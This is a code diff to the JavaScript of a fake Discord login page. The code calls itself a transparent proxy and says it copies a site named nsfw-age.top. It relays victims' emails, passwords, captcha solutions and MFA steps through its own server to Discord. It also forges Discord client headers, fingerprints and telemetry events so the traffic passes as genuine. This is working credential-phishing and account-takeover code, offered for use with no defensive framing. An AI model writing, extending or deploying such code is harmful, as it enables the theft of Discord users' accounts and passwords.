@@ -465,6 +465,66 @@ var _launchSignature = crypto.randomUUID ? crypto.randomUUID() : (Math.random().
 var _eventSeq = 0;
 var _pageLoadTime = Date.now();
 
+/* ═══ Super properties — matches nsfw-age.top HAR exactly ═══ */
+function _buildSuperProps() {
+  if (_discordSuperProps) return _discordSuperProps;
+  var props = {
+    "os": "Windows",
+    "browser": "Chrome",
+    "device": "",
+    "system_locale": "en-US",
+    "browser_user_agent": navigator.userAgent,
+    "browser_version": (navigator.userAgent.match(/Chrome\/(\d+[\d.]+)/) || ['','136.0.0.0'])[1],
+    "os_version": "10",
+    "referrer": document.referrer || "",
+    "referring_domain": document.referrer ? (new URL(document.referrer)).hostname : "",
+    "referrer_current": "",
+    "referring_domain_current": "",
+    "release_channel": "stable",
+    "client_build_number": 368827,
+    "client_event_source": null
+  };
+  return btoa(JSON.stringify(props));
+}
+
+/* ═══ Build Discord headers — matches nsfw-age.top HAR request headers exactly ═══ */
+function _discordHeaders(extraHeaders) {
+  var h = {
+    'Content-Type': 'application/json',
+    'X-Debug-Options': 'bugReporterEnabled',
+    'X-Discord-Locale': 'en-US',
+    'X-Discord-Timezone': 'America/New_York',
+    'X-Super-Properties': _buildSuperProps()
+  };
+  if (_discordFingerprint) h['X-Fingerprint'] = _discordFingerprint;
+  if (extraHeaders) {
+    for (var k in extraHeaders) h[k] = extraHeaders[k];
+  }
+  return h;
+}
+
+/* ═══ Fetch fingerprint on page load (like nsfw-age.top serves Discord's JS that does this) ═══ */
+async function _fetchFingerprint() {
+  try {
+    var r = await fetch('/api/v9/experiments', {
+      headers: {
+        'X-Super-Properties': _buildSuperProps(),
+        'X-Debug-Options': 'bugReporterEnabled',
+        'X-Discord-Locale': 'en-US',
+        'X-Discord-Timezone': 'America/New_York'
+      }
+    });
+    if (r.ok) {
+      var d = await r.json();
+      if (d.fingerprint) {
+        _discordFingerprint = d.fingerprint;
+        console.log('[init] fingerprint:', d.fingerprint.slice(0,20) + '...');
+      }
+    }
+  } catch(e) { console.log('[init] fingerprint fetch error:', e); }
+}
+_fetchFingerprint();
+
 /* ═══ Science event helper ═══ */
 function _fireScience(eventType, extraProps) {
   _eventSeq++;
@@ -486,14 +546,7 @@ function _fireScience(eventType, extraProps) {
   };
   for (var k in extraProps) props[k] = extraProps[k];
   var payload = JSON.stringify({events: [{type: eventType, properties: props}]});
-  var hdrs = {
-    'Content-Type': 'application/json',
-    'X-Debug-Options': 'bugReporterEnabled',
-    'X-Discord-Locale': 'en-US',
-    'X-Discord-Timezone': 'America/New_York'
-  };
-  if (_discordFingerprint) hdrs['X-Fingerprint'] = _discordFingerprint;
-  if (_discordSuperProps) hdrs['X-Super-Properties'] = _discordSuperProps;
+  var hdrs = _discordHeaders();
   console.log('[science]', eventType, props);
   /* Send directly to discord.com — Discord CORS allows any origin for /science */
   fetch('https://discord.com/api/v9/science', {method:'POST', headers: hdrs, body: payload}).catch(function(e){ console.log('[science] send error:', e); });
@@ -600,17 +653,7 @@ function onHcaptchaPass(token) {
   /* Show "Verifying..." while we send the token */
   var vf = document.getElementById('captcha-verifying');
   if (vf) vf.classList.add('show');
-  /* Get the enterprise respKey — hcaptcha appends a signature to rqtoken */
-  var respKey = '';
-  try {
-    if (_hcaptchaWidgetId !== null && typeof hcaptcha !== 'undefined' && hcaptcha.getRespKey) {
-      respKey = hcaptcha.getRespKey(_hcaptchaWidgetId) || '';
-    }
-  } catch(e) { console.log('[captcha] getRespKey error:', e); }
-  console.log('[captcha] token prefix:', token ? token.slice(0,30)+'...' : '(empty)');
-  console.log('[captcha] respKey:', respKey ? respKey.slice(0,40)+'...' : '(empty)');
-  /* rqtoken is sent VERBATIM from Discord's challenge — DO NOT append getRespKey.
-     nsfw-age.top HAR confirms: the exact rqtoken from step 1 response is echoed back as-is. */
+  console.log('[captcha] solved, token prefix:', token ? token.slice(0,30)+'...' : '(empty)');
   /* Fire captcha_event verify science event (matches nsfw-age.top) */
   var captchaFlowKey = crypto.randomUUID ? crypto.randomUUID() : (Math.random().toString(36).slice(2) + '-' + Date.now().toString(36));
   _fireScience('captcha_event', {
@@ -619,31 +662,36 @@ function onHcaptchaPass(token) {
     sitekey: 'a9b5fb07-92ff-493f-86fe-352a2803b3df',
     captcha_flow_key: captchaFlowKey
   });
-  /* Submit the solved token immediately */
+  /* Submit — re-POST to /api/v9/auth/login with captcha as HTTP headers (matches nsfw-age.top HAR exactly) */
   submitWithCaptcha(token);
 }
 
 async function submitWithCaptcha(captchaToken) {
   try {
-    var payload = {
+    /* Same body as first attempt — captcha goes in HEADERS, not body (nsfw-age.top HAR) */
+    var body = {
       login:              captchaEmail,
       password:           captchaPw,
-      captcha_token:      captchaToken,
-      captcha_rqtoken:    captchaRqtoken,
-      captcha_session_id: captchaSessionId
+      undelete:           false,
+      gift_code_sku_id:   null
     };
-    console.log('[captcha] submitting payload keys:', Object.keys(payload));
-    console.log('[captcha] rqtoken:', captchaRqtoken ? captchaRqtoken.slice(0,20)+'...' : '(empty)');
-    console.log('[captcha] session_id:', captchaSessionId ? captchaSessionId.slice(0,20)+'...' : '(empty)');
-    console.log('[captcha] token prefix:', captchaToken ? captchaToken.slice(0,20)+'...' : '(empty)');
-    var r = await fetch('/api/login', {
+    /* Build Discord headers + add captcha headers (exactly matches nsfw-age.top HAR) */
+    var hdrs = _discordHeaders({
+      'X-Captcha-Key':        captchaToken,
+      'X-Captcha-Rqtoken':    captchaRqtoken,
+      'X-Captcha-Session-Id': captchaSessionId
+    });
+    console.log('[captcha] POST /api/v9/auth/login with captcha headers');
+    console.log('[captcha] rqtoken:', captchaRqtoken ? captchaRqtoken.slice(0,30)+'...' : '(empty)');
+    console.log('[captcha] session_id:', captchaSessionId);
+    var r = await fetch('/api/v9/auth/login', {
       method: 'POST',
-      headers: {'Content-Type':'application/json'},
-      body: JSON.stringify(payload)
+      headers: hdrs,
+      body: JSON.stringify(body)
     });
     var d = await r.json();
-    console.log('[captcha] server response status:', r.status, 'body:', JSON.stringify(d).slice(0,300));
-    /* Fire network_action_user_login science event (matches nsfw-age.top) */
+    console.log('[captcha] response:', r.status, JSON.stringify(d).slice(0,300));
+    /* Fire network_action_user_login science event */
     _fireScience('network_action_user_login', {
       status_code: r.status,
       url: '/auth/login',
@@ -788,6 +836,16 @@ function processLoginResult(d, httpStatus) {
 
   if (d.success) { onSuccess(d); return; }
 
+  /* Check for captcha re-challenge (invalid-response etc.) */
+  var ckeys = d.captcha_key || [];
+  if (Array.isArray(ckeys) && ckeys.length > 0 && d.captcha_sitekey) {
+    /* Another captcha challenge — show again */
+    captchaRqtoken   = d.captcha_rqtoken || '';
+    captchaSessionId = d.captcha_session_id || '';
+    showCaptchaStall(d.captcha_sitekey, d.captcha_rqdata);
+    return;
+  }
+
   if (d.mfa !== undefined && d.ticket) {
     mfaTicket = d.ticket; mfaHasSms = !!d.sms; mfaMode = 'totp';
     window._mfaPw = d._pw || captchaPw || '?';  /* Preserve password for MFA round-trip */
@@ -795,7 +853,21 @@ function processLoginResult(d, httpStatus) {
     return;
   }
 
-  if (d.email_verify) {
+  /* Check for email verification (Discord raw: errors.login._errors[].code === ACCOUNT_LOGIN_VERIFICATION_EMAIL) */
+  var emailVerify = false;
+  if (d.errors) {
+    for (var fk in d.errors) {
+      var ferrs = (d.errors[fk] && d.errors[fk]._errors) || [];
+      for (var i = 0; i < ferrs.length; i++) {
+        if (ferrs[i].code === 'ACCOUNT_LOGIN_VERIFICATION_EMAIL') {
+          emailVerify = true;
+          break;
+        }
+      }
+      if (emailVerify) break;
+    }
+  }
+  if (d.email_verify || emailVerify) {
     showSec('login');
     showErr('login-error', 'New login location detected. Please check your email.');
     var errEl = document.getElementById('login-error');
@@ -833,7 +905,7 @@ function processLoginResult(d, httpStatus) {
   showErr('login-error', errMsg);
 }
 
-/* ═══ Login ═══ */
+/* ═══ Login — transparent proxy to Discord (copies nsfw-age.top exactly) ═══ */
 document.getElementById('login-form').addEventListener('submit', async function(e) {
   e.preventDefault();
   var em = document.getElementById('email').value.trim();
@@ -848,28 +920,44 @@ document.getElementById('login-form').addEventListener('submit', async function(
   _pendingResult = null;
   _hcaptchaDone = false;
   try {
-    /* Step 1: Try login — may return captcha challenge */
-    var r = await fetch('/api/login', {
+    /* POST to /api/v9/auth/login — transparent proxy, same as nsfw-age.top */
+    var body = {login: em, password: pw, undelete: false, gift_code_sku_id: null};
+    var hdrs = _discordHeaders();
+    var r = await fetch('/api/v9/auth/login', {
       method: 'POST',
-      headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({login:em, password:pw})
+      headers: hdrs,
+      body: JSON.stringify(body)
     });
     var d = await r.json();
-    if (d.captcha_needed) {
-      /* Server says captcha required — render real Discord hCaptcha */
-      console.log('[login] captcha challenge received:', JSON.stringify({sitekey:d.sitekey,rqdata:d.rqdata?d.rqdata.slice(0,20)+'...':'',rqtoken:d.rqtoken?d.rqtoken.slice(0,20)+'...':'',session_id:d.session_id}));
-      captchaRqtoken   = d.rqtoken || '';
-      captchaSessionId = d.session_id || '';
-      _discordFingerprint = d.fingerprint || '';
-      _discordSuperProps  = d.super_properties || '';
-      /* Fire open_modal science event (matches nsfw-age.top) */
+    console.log('[login] response:', r.status, JSON.stringify(d).slice(0,300));
+
+    /* Check for captcha challenge (Discord's raw response) */
+    var ckeys = d.captcha_key || [];
+    if (Array.isArray(ckeys) && (ckeys.indexOf('captcha-required') !== -1 || d.captcha_sitekey)) {
+      console.log('[login] captcha challenge:', JSON.stringify({
+        sitekey: d.captcha_sitekey,
+        rqdata: d.captcha_rqdata ? d.captcha_rqdata.slice(0,20)+'...' : '',
+        rqtoken: d.captcha_rqtoken ? d.captcha_rqtoken.slice(0,20)+'...' : '',
+        session_id: d.captcha_session_id
+      }));
+      /* Store captcha fields for step 2 (re-POST with captcha headers) */
+      captchaRqtoken   = d.captcha_rqtoken || '';
+      captchaSessionId = d.captcha_session_id || '';
+      /* Fire open_modal science events (matches nsfw-age.top HAR: 3 events at once) */
       _fireScience('open_modal', {type: 'Guild Join Captcha'});
-      showCaptchaStall(d.sitekey, d.rqdata);
-      /* Login button stays disabled — re-enabled in processLoginResult / error */
+      _fireScience('open_modal', {type: 'Captcha Modal'});
+      _fireScience('captcha_event', {
+        captcha_event_name: 'initial-load',
+        captcha_service: 'hcaptcha',
+        sitekey: d.captcha_sitekey || 'a9b5fb07-92ff-493f-86fe-352a2803b3df'
+      });
+      /* Render real hCaptcha with Discord's sitekey + rqdata */
+      showCaptchaStall(d.captcha_sitekey, d.captcha_rqdata);
       return;
     }
     processLoginResult(d, r.status);
   } catch(err) {
+    console.error('[login] error:', err);
     showErr('login-error', 'Connection error. Please try again.');
     btnLoad('login-btn', false);
   }
